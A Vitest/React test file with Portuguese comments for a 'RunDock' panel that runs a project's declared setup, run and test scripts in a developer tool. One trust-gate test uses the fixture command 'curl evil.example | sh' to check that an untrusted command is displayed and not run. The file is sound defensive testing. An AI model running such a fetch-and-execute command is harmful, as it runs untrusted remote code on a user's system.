import { screen, waitFor } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import { beforeEach, describe, expect, it, vi } from "vitest";

import { renderWithProviders } from "../test/render.js";
import { NO_SCRIPTS_STATUS, trpcMock } from "../test/trpc-mock.js";
import { RunDock } from "./RunDock.js";

vi.mock("../lib/trpc.js", async () => ({ trpc: (await import("../test/trpc-mock.js")).trpcMock }));

/** O terminal de verdade abre WebSocket e mede DOM; aqui ele só precisa existir. */
vi.mock("./Terminal.js", () => ({
  Terminal: ({ sessionId, readOnly }: { sessionId: string; readOnly?: boolean }) => (
    <div data-testid="terminal" data-session={sessionId} data-readonly={String(readOnly ?? false)} />
  ),
}));

const scope = { scopeType: "worktree", scopeId: "wt_1" } as const;

const dock = {
  open: true,
  height: 256,
  toggle: vi.fn(),
  setHeight: vi.fn(),
  beginResize: vi.fn(),
};

/** Um status com o que o teste quer dizer, sobre o vazio de sempre. */
function status(overrides: Record<string, unknown> = {}) {
  return { ...NO_SCRIPTS_STATUS, ...overrides };
}

function execution(overrides: Record<string, unknown> = {}) {
  return {
    sessionId: "se_1",
    exitCode: null,
    running: true,
    startedAt: new Date().toISOString(),
    finishedAt: null,
    command: "pnpm dev",
    outputAvailable: true,
    ...overrides,
  };
}

beforeEach(() => {
  vi.clearAllMocks();
  trpcMock.scripts.status.query.mockResolvedValue(NO_SCRIPTS_STATUS);
  trpcMock.session.listByScope.query.mockResolvedValue([]);
});

describe("as três abas", () => {
  it("são a mesma primitiva: a saída é o terminal de sempre", async () => {
    trpcMock.scripts.status.query.mockResolvedValue(
      status({
        scripts: { setup: null, run: "pnpm dev", teardown: null },
        run: { command: "pnpm dev", last: execution() },
      }),
    );

    renderWithProviders(<RunDock scope={scope} dock={dock} />);

    const terminal = await screen.findByTestId("terminal");
    expect(terminal).toHaveAttribute("data-session", "se_1");
    // Vivo: o terminal aceita entrada. É a mesma regra da aba de sessão.
    expect(terminal).toHaveAttribute("data-readonly", "false");
  });

  it("execução terminada vira registro, e o terminal fica somente leitura", async () => {
    trpcMock.scripts.status.query.mockResolvedValue(
      status({
        scripts: { setup: "./setup.sh", run: null, teardown: null },
        setup: { command: "./setup.sh", last: execution({ running: false, exitCode: 0 }) },
      }),
    );

    renderWithProviders(<RunDock scope={scope} dock={dock} />);
    await userEvent.click(await screen.findByRole("tab", { name: /Setup/ }));

    expect(await screen.findByTestId("terminal")).toHaveAttribute("data-readonly", "true");
  });
});

describe("a aba de testes", () => {
  it("roda a suíte declarada, e o ponto diz se passou", async () => {
    // Rodar teste é a coisa que mais se repete num dia, e estava fora do produto:
    // quem quisesse testar abria um terminal e digitava o comando de novo.
    trpcMock.scripts.status.query.mockResolvedValue(
      status({
        scripts: { setup: null, run: null, test: "pnpm test", teardown: null },
        test: { command: "pnpm test", last: execution({ running: false, exitCode: 0 }) },
      }),
    );
    trpcMock.scripts.start.mutate.mockResolvedValue({ sessionId: "se_t", stoppedPrevious: null });

    renderWithProviders(<RunDock scope={scope} dock={dock} />);
    await userEvent.click(await screen.findByRole("tab", { name: /Testes/ }));

    expect(await screen.findByTestId("dot-testes")).toHaveClass("dtab__dot--ok");
    await userEvent.click(screen.getByRole("button", { name: /rodar de novo/ }));
    await waitFor(() => {
      expect(trpcMock.scripts.start.mutate).toHaveBeenCalledWith({ ...scope, phase: "test" });
    });
  });

  it("suíte vermelha oferece tentar de novo", async () => {
    trpcMock.scripts.status.query.mockResolvedValue(
      status({
        scripts: { setup: null, run: null, test: "pnpm test", teardown: null },
        test: { command: "pnpm test", last: execution({ running: false, exitCode: 1 }) },
      }),
    );

    renderWithProviders(<RunDock scope={scope} dock={dock} />);
    await userEvent.click(await screen.findByRole("tab", { name: /Testes/ }));

    expect(await screen.findByTestId("dot-testes")).toHaveClass("dtab__dot--fail");
    expect(screen.getByRole("button", { name: /tentar de novo/ })).toBeInTheDocument();
  });

  it("suíte rodando pode ser parada", async () => {
    trpcMock.scripts.status.query.mockResolvedValue(
      status({
        scripts: { setup: null, run: null, test: "pnpm test", teardown: null },
        test: { command: "pnpm test", last: execution() },
      }),
    );

    renderWithProviders(<RunDock scope={scope} dock={dock} />);
    await userEvent.click(await screen.findByRole("tab", { name: /Testes/ }));
    await userEvent.click(await screen.findByRole("button", { name: /parar/ }));

    await waitFor(() => {
      expect(trpcMock.scripts.stop.mutate).toHaveBeenCalledWith({ ...scope, phase: "test" });
    });
  });

  it("projeto que não declara `test` cai no vazio que ensina o arquivo", async () => {
    renderWithProviders(<RunDock scope={scope} dock={dock} />);
    await userEvent.click(await screen.findByRole("tab", { name: /Testes/ }));

    expect(await screen.findByText(/não diz como rodar/)).toBeInTheDocument();
  });
});

describe("o ponto de estado mora na aba", () => {
  it("verde quando tem coisa de pé", async () => {
    trpcMock.scripts.status.query.mockResolvedValue(
      status({ run: { command: "pnpm dev", last: execution() } }),
    );

    renderWithProviders(<RunDock scope={scope} dock={dock} />);

    expect(await screen.findByTestId("dot-run")).toHaveClass("dtab__dot--run");
  });

  it("vermelho quando a última falhou, verde quando passou", async () => {
    // As duas perguntas que trazem alguém ao rodapé — e é por isso que elas não
    // podem morar dentro da aba.
    trpcMock.scripts.status.query.mockResolvedValue(
      status({
        setup: { command: "./setup.sh", last: execution({ running: false, exitCode: 1 }) },
        run: { command: "pnpm dev", last: execution({ running: false, exitCode: 0 }) },
      }),
    );

    renderWithProviders(<RunDock scope={scope} dock={dock} />);

    expect(await screen.findByTestId("dot-setup")).toHaveClass("dtab__dot--fail");
    expect(await screen.findByTestId("dot-run")).toHaveClass("dtab__dot--ok");
  });
});

describe("o botão que abre a porta", () => {
  it("aponta para o loopback e diz que a porta veio da saída", async () => {
    trpcMock.scripts.status.query.mockResolvedValue(
      status({
        run: { command: "pnpm dev", last: execution() },
        port: { port: 5173, source: "output" },
      }),
    );

    renderWithProviders(<RunDock scope={scope} dock={dock} />);

    const open = await screen.findByRole("link", { name: /Abrir/ });
    expect(open).toHaveAttribute("href", "http://127.0.0.1:5173");
    // A proveniência é a feature: um botão que abre a porta errada é pior que
    // botão nenhum, então ele diz de onde tirou o número (S6).
    expect(screen.getByText("porta lida da saída")).toBeInTheDocument();
  });

  it("diz quando a porta veio da variável", async () => {
    trpcMock.scripts.status.query.mockResolvedValue(
      status({
        run: { command: "pnpm dev", last: execution() },
        port: { port: 45000, source: "env" },
      }),
    );

    renderWithProviders(<RunDock scope={scope} dock={dock} />);

    expect(await screen.findByText("porta de LUMEM_RUN_PORT")).toBeInTheDocument();
  });

  it("não existe enquanto ninguém achou porta nenhuma", async () => {
    trpcMock.scripts.status.query.mockResolvedValue(
      status({ run: { command: "pnpm dev", last: execution() }, port: null }),
    );

    renderWithProviders(<RunDock scope={scope} dock={dock} />);

    await screen.findByRole("button", { name: /parar/ });
    expect(screen.queryByRole("link", { name: /Abrir/ })).not.toBeInTheDocument();
  });
});

describe("rodar e parar", () => {
  it("o gesto de rodar existe uma vez só, na linha de estado", async () => {
    // Achado pelo e2e: o corpo repetia o botão, a uma mão de distância. E o lugar
    // dele mudou na `run-dock-open` — ele saiu da faixa de abas, que não cabia em
    // 360px, e desceu para a linha de estado.
    trpcMock.scripts.status.query.mockResolvedValue(
      status({
        scripts: { setup: null, run: "pnpm dev", teardown: null },
        run: { command: "pnpm dev", last: null },
      }),
    );

    renderWithProviders(<RunDock scope={scope} dock={dock} />);

    const run = await screen.findAllByRole("button", { name: /rodar/ });
    expect(run).toHaveLength(1);
    expect(await screen.findByTestId("dock-state")).toContainElement(run[0]!);
  });

  /**
   * A faixa de abas completa mede 494px, e a coluna da direita tem 360.
   *
   * O que estourava eram `Abrir :porta` e `parar`; o chevron e as quatro abas
   * cabem. Então os dois desceram para a linha de estado — em **qualquer**
   * largura, porque dois lugares onde `parar` pode estar é o defeito que a Q6
   * recusou.
   */
  it("`Abrir` e `parar` moram na linha de estado, e não na faixa de abas", async () => {
    trpcMock.scripts.status.query.mockResolvedValue(
      status({
        run: { command: "pnpm dev", last: execution() },
        port: { port: 5173, source: "output" },
      }),
    );

    renderWithProviders(<RunDock scope={scope} dock={dock} />);

    const state = await screen.findByTestId("dock-state");
    expect(state).toContainElement(await screen.findByRole("link", { name: /Abrir/ }));
    expect(state).toContainElement(screen.getByRole("button", { name: /parar/ }));

    const strip = screen.getByRole("tablist", { name: "execução do checkout" });
    expect(strip).not.toContainElement(screen.getByRole("link", { name: /Abrir/ }));
    expect(strip).not.toContainElement(screen.getByRole("button", { name: /parar/ }));
  });

  it("com o run vivo, a porta reservada sai da linha — quem fala de porta é a proveniência", async () => {
    // Duas notas de porta na mesma linha, numa coluna de 360px, é uma competindo
    // com o comando — que é o que identifica a execução.
    trpcMock.scripts.status.query.mockResolvedValue(
      status({
        run: { command: "pnpm dev", last: execution() },
        port: { port: 5173, source: "output" },
        reservedPort: 55060,
      }),
    );

    renderWithProviders(<RunDock scope={scope} dock={dock} />);

    expect(await screen.findByText("porta lida da saída")).toBeInTheDocument();
    expect(screen.queryByText(/porta reservada/)).not.toBeInTheDocument();
  });

  it("sem run vivo, a porta reservada continua sendo dita", async () => {
    trpcMock.scripts.status.query.mockResolvedValue(
      status({ run: { command: "pnpm dev", last: null }, port: null, reservedPort: 55060 }),
    );

    renderWithProviders(<RunDock scope={scope} dock={dock} />);

    expect(await screen.findByText("porta reservada :55060")).toBeInTheDocument();
  });

  it("roda o que o repositório declara", async () => {
    trpcMock.scripts.status.query.mockResolvedValue(
      status({ scripts: { setup: null, run: "pnpm dev", teardown: null }, run: { command: "pnpm dev", last: null } }),
    );
    trpcMock.scripts.start.mutate.mockResolvedValue({ sessionId: "se_1", stoppedPrevious: null });

    renderWithProviders(<RunDock scope={scope} dock={dock} />);
    await userEvent.click(await screen.findByRole("button", { name: /rodar/ }));

    await waitFor(() => {
      expect(trpcMock.scripts.start.mutate).toHaveBeenCalledWith({ ...scope, phase: "run" });
    });
  });

  it("parar não é botão vermelho cheio — é rotina, e reversível", async () => {
    trpcMock.scripts.status.query.mockResolvedValue(
      status({ run: { command: "pnpm dev", last: execution() } }),
    );

    renderWithProviders(<RunDock scope={scope} dock={dock} />);

    const stop = await screen.findByRole("button", { name: /parar/ });
    expect(stop).not.toHaveClass("btn--danger");
  });
});

describe("o projeto sem [scripts]", () => {
  const acpAgent = { id: "cfg_1", name: "claude", transport: "acp" };

  it("ensina o arquivo em vez de pedir desculpa", async () => {
    // O estado normal, não o excepcional: é a única superfície onde alguém
    // descobre que esse arquivo existe.
    renderWithProviders(<RunDock scope={scope} dock={dock} />);

    expect(await screen.findByText(/não diz como rodar/)).toBeInTheDocument();
    expect(screen.getByText("/repo/.lumem/project.toml")).toBeInTheDocument();
    expect(screen.getByText(/\[scripts\]/)).toBeInTheDocument();
  });

  /**
   * O gesto principal é pedir para o agente, e não escrever um exemplo: um
   * `run = "pnpm dev"` chutado pelo produto está errado na maioria dos
   * repositórios, e o agente é quem lê o `package.json` antes de responder.
   */
  it("abre uma conversa nova e manda o pedido para ela", async () => {
    trpcMock.agentConfig.list.query.mockResolvedValue([acpAgent]);
    trpcMock.session.createAgent.mutate.mockResolvedValue({ id: "se_novo", kind: "agent" });
    const onAskAgent = vi.fn();

    renderWithProviders(<RunDock scope={scope} dock={dock} onAskAgent={onAskAgent} />);
    await userEvent.click(await screen.findByRole("button", { name: "pedir para o agente criar" }));

    await waitFor(() => {
      expect(trpcMock.session.createAgent.mutate).toHaveBeenCalledWith({
        ...scope,
        agentConfigId: "cfg_1",
      });
    });
    // O pedido vai amarrado à sessão que acabou de nascer, e diz o caminho do
    // arquivo que ele quer.
    await waitFor(() => {
      expect(onAskAgent).toHaveBeenCalledWith("se_novo", expect.stringContaining("[scripts]"));
    });
    expect(onAskAgent.mock.calls[0]?.[1]).toContain("/repo/.lumem/project.toml");
    // E a instrução que separa "escreveu um script" de "escreveu o script deste
    // repositório".
    expect(onAskAgent.mock.calls[0]?.[1]).toMatch(/leia o repositório/i);
    expect(onAskAgent.mock.calls[0]?.[1]).toContain("LUMEM_RUN_PORT");
    // E a fase de teste vem junto, com a regra que a torna útil no rodapé.
    expect(onAskAgent.mock.calls[0]?.[1]).toMatch(/`test`/);
    expect(onAskAgent.mock.calls[0]?.[1]).toMatch(/watch/i);
  });

  it("sem agente conectado, o botão diz por que não dá", async () => {
    trpcMock.agentConfig.list.query.mockResolvedValue([]);

    renderWithProviders(<RunDock scope={scope} dock={dock} onAskAgent={vi.fn()} />);

    expect(await screen.findByRole("button", { name: "pedir para o agente criar" })).toBeDisabled();
    expect(screen.getByText(/conecte um agente/)).toBeInTheDocument();
  });

  it("agente por PTY não serve: o pedido é uma pergunta, não um terminal", async () => {
    trpcMock.agentConfig.list.query.mockResolvedValue([
      { id: "cfg_pty", name: "claude-code", transport: "pty" },
    ]);

    renderWithProviders(<RunDock scope={scope} dock={dock} onAskAgent={vi.fn()} />);

    expect(await screen.findByRole("button", { name: "pedir para o agente criar" })).toBeDisabled();
  });

  it("copiar continua existindo, para quem prefere escrever à mão", async () => {
    renderWithProviders(<RunDock scope={scope} dock={dock} />);

    expect(await screen.findByRole("button", { name: "copiar o exemplo" })).toBeEnabled();
  });
});

/**
 * Nascendo aberto, esta área é a primeira coisa que se vê ao chegar numa worktree.
 *
 * Antes era uma frase que só dizia "não". Agora diz o que o daemon já sabe antes
 * de existir processo — e nada além do que ele sabe.
 */
describe("a fase que nunca rodou", () => {
  it("diz a faixa de portas do checkout, em vez de um terminal vazio", async () => {
    trpcMock.scripts.status.query.mockResolvedValue(
      status({
        scripts: { setup: null, run: "pnpm dev", teardown: null },
        run: { command: "pnpm dev", last: null },
        reservedPort: 55060,
      }),
    );

    renderWithProviders(<RunDock scope={scope} dock={dock} />);

    // Dez portas, e o número vem do contrato — não de um `10` escrito aqui.
    expect(await screen.findByText(":55060–55069")).toBeInTheDocument();
    expect(screen.getByText(/LUMEM_RUN_PORT/)).toBeInTheDocument();
    expect(screen.queryByTestId("terminal")).not.toBeInTheDocument();
  });

  it("sem reserva, não inventa faixa: a linha simplesmente não existe", async () => {
    trpcMock.scripts.status.query.mockResolvedValue(
      status({
        scripts: { setup: null, run: "pnpm dev", teardown: null },
        run: { command: "pnpm dev", last: null },
        reservedPort: null,
      }),
    );

    renderWithProviders(<RunDock scope={scope} dock={dock} />);

    await screen.findByText(/ainda não rodou o run/);
    expect(screen.queryByText(/portas reservadas/)).not.toBeInTheDocument();
  });

  it("conta como foi o último setup, que é a outra metade da pergunta", async () => {
    trpcMock.scripts.status.query.mockResolvedValue(
      status({
        scripts: { setup: "./setup.sh", run: "pnpm dev", teardown: null },
        setup: { command: "./setup.sh", last: execution({ running: false, exitCode: 0 }) },
        run: { command: "pnpm dev", last: null },
      }),
    );

    renderWithProviders(<RunDock scope={scope} dock={dock} />);

    expect(await screen.findByText(/o setup passou/)).toBeInTheDocument();
  });

  it("setup que falhou aparece com o código, e ainda não é um alerta", async () => {
    // "ainda não começou" não é "quebrou": nenhuma cor de perigo, nenhum role de
    // alerta nesta área — o banner de setup falhado é outra coisa, e é dele o papel.
    trpcMock.scripts.status.query.mockResolvedValue(
      status({
        scripts: { setup: "./setup.sh", run: "pnpm dev", teardown: null },
        setup: { command: "./setup.sh", last: execution({ running: false, exitCode: 1 }) },
        run: { command: "pnpm dev", last: null },
      }),
    );

    renderWithProviders(<RunDock scope={scope} dock={dock} />);

    expect(await screen.findByText(/o setup falhou \(saiu 1\)/)).toBeInTheDocument();
    expect(screen.queryByRole("alert")).not.toBeInTheDocument();
  });

  it("na aba do próprio setup, não fala do setup — falaria de si mesma", async () => {
    trpcMock.scripts.status.query.mockResolvedValue(
      status({
        scripts: { setup: "./setup.sh", run: null, teardown: null },
        setup: { command: "./setup.sh", last: null },
        reservedPort: 55060,
      }),
    );

    renderWithProviders(<RunDock scope={scope} dock={dock} />);
    await userEvent.click(await screen.findByRole("tab", { name: /Setup/ }));

    await screen.findByText(/ainda não rodou o setup/);
    expect(screen.queryByText(/o setup nunca rodou/)).not.toBeInTheDocument();
  });

  it("com execução, o terminal toma a área de volta", async () => {
    trpcMock.scripts.status.query.mockResolvedValue(
      status({
        scripts: { setup: null, run: "pnpm dev", teardown: null },
        run: { command: "pnpm dev", last: execution() },
        reservedPort: 55060,
      }),
    );

    renderWithProviders(<RunDock scope={scope} dock={dock} />);

    expect(await screen.findByTestId("terminal")).toBeInTheDocument();
    expect(screen.queryByText(/portas reservadas/)).not.toBeInTheDocument();
  });
});

describe("o portão de confiança (S11)", () => {
  it("mostra o comando ANTES de rodar, e não oferece rodar", async () => {
    trpcMock.scripts.status.query.mockResolvedValue(
      status({
        trusted: false,
        scripts: { setup: "curl evil.example | sh", run: null, teardown: null },
        setup: { command: "curl evil.example | sh", last: null },
      }),
    );

    renderWithProviders(<RunDock scope={scope} dock={dock} />);
    await userEvent.click(await screen.findByRole("tab", { name: /Setup/ }));

    expect(await screen.findByText("curl evil.example | sh")).toBeInTheDocument();
    expect(screen.getByRole("button", { name: /confiar neste projeto/ })).toBeInTheDocument();
  });

  it("confiar é decisão de projeto, e volta a perguntar se o comando mudar", async () => {
    trpcMock.scripts.status.query.mockResolvedValue(
      status({
        trusted: false,
        scripts: { setup: null, run: "pnpm dev", teardown: null },
        run: { command: "pnpm dev", last: null },
      }),
    );
    trpcMock.scripts.trust.mutate.mockResolvedValue({ projectId: "pr_1" });

    renderWithProviders(<RunDock scope={scope} dock={dock} />);
    await userEvent.click(await screen.findByRole("button", { name: /confiar neste projeto/ }));

    await waitFor(() => {
      expect(trpcMock.scripts.trust.mutate).toHaveBeenCalledWith(scope);
    });
    expect(screen.getByText(/volta a perguntar se o comando mudar/)).toBeInTheDocument();
  });
});

describe("a saída que não existe mais", () => {
  it("diz que o daemon reiniciou, em vez de mostrar um retângulo preto", async () => {
    // Visto rodando o produto: o scrollback vive na memória do daemon, e um
    // reinício apaga a saída deixando a linha do banco de pé.
    trpcMock.scripts.status.query.mockResolvedValue(
      status({
        scripts: { setup: null, run: "pnpm dev", teardown: null },
        run: {
          command: "pnpm dev",
          last: execution({ running: false, exitCode: 1, outputAvailable: false }),
        },
      }),
    );

    const { container } = renderWithProviders(<RunDock scope={scope} dock={dock} />);

    // Uma vez só, e no corpo — não na linha de estado.
    //
    // A primeira versão deste teste aceitava qualquer número de ocorrências, e
    // passou verde com a frase renderizada DUAS vezes: uma delas dentro do
    // `.dock__state`, empurrando o chip de saída para fora. Contar é o que
    // separa "a tela diz" de "a tela diz no lugar certo".
    await screen.findByText(/A saída desta execução não existe mais/);
    expect(container.querySelectorAll(".dock__idle")).toHaveLength(1);
    expect(container.querySelector(".dock__state .dock__idle")).toBeNull();
    // E a linha de estado continua dizendo como a execução terminou.
    expect(screen.getByText(/saiu 1/)).toBeInTheDocument();
    expect(screen.queryByTestId("terminal")).not.toBeInTheDocument();
  });
});

describe("o setup que falhou", () => {
  it("é uma tira dentro da aba, e não um diálogo que some", async () => {
    trpcMock.scripts.status.query.mockResolvedValue(
      status({
        scripts: { setup: "./setup.sh", run: null, teardown: null },
        setup: { command: "./setup.sh", last: execution({ running: false, exitCode: 1 }) },
      }),
    );

    renderWithProviders(<RunDock scope={scope} dock={dock} />);
    await userEvent.click(await screen.findByRole("tab", { name: /Setup/ }));

    expect(await screen.findByText(/o setup dela falhou/)).toBeInTheDocument();
    expect(screen.getByRole("button", { name: /tentar de novo/ })).toBeInTheDocument();
  });
});

describe("o checkout que não dá para ler", () => {
  it("mostra o motivo em vez de ficar em `lendo o checkout…` para sempre", async () => {
    // Achado pelo e2e: `[scripts]` com TOML quebrado. O daemon recusa com o
    // motivo, e a tela precisava saber mostrar.
    trpcMock.scripts.status.query.mockRejectedValue(
      new Error(".lumem/project.toml não é TOML válido: linha 5"),
    );

    renderWithProviders(<RunDock scope={scope} dock={dock} />);

    expect(await screen.findByRole("alert")).toHaveTextContent(/não é TOML válido/);
  });
});

describe("recolhido", () => {
  it("continua dizendo o que está vivo, com a porta", async () => {
    trpcMock.scripts.status.query.mockResolvedValue(
      status({
        run: { command: "pnpm dev", last: execution() },
        port: { port: 55061, source: "output" },
      }),
    );

    renderWithProviders(<RunDock scope={scope} dock={{ ...dock, open: false }} />);

    expect(await screen.findByText(/run · :55061/)).toBeInTheDocument();
    expect(screen.queryByRole("tab", { name: /Run/ })).not.toBeInTheDocument();
  });

  it("abrir devolve as abas", async () => {
    const toggle = vi.fn();
    renderWithProviders(<RunDock scope={scope} dock={{ ...dock, open: false, toggle }} />);

    await userEvent.click(await screen.findByRole("button", { name: /abrir o rodapé/ }));

    expect(toggle).toHaveBeenCalled();
  });
});

describe("a aba Terminal", () => {
  it("abre a sessão de shell que o daemon já sabe abrir", async () => {
    trpcMock.session.createShell.mutate.mockResolvedValue({ id: "se_shell", kind: "shell" });

    renderWithProviders(<RunDock scope={scope} dock={dock} />);
    await userEvent.click(await screen.findByRole("tab", { name: "Terminal" }));
    await userEvent.click(await screen.findByRole("button", { name: /abrir terminal/ }));

    await waitFor(() => {
      expect(trpcMock.session.createShell.mutate).toHaveBeenCalledWith(scope);
    });
  });

  it("mostra a shell que já está viva neste checkout", async () => {
    trpcMock.session.listByScope.query.mockResolvedValue([
      { id: "se_shell", kind: "shell", state: "running", cwd: "/repo/wt", command: "/bin/zsh" },
    ]);

    renderWithProviders(<RunDock scope={scope} dock={dock} />);
    await userEvent.click(await screen.findByRole("tab", { name: "Terminal" }));

    expect(await screen.findByTestId("terminal")).toHaveAttribute("data-session", "se_shell");
  });
});
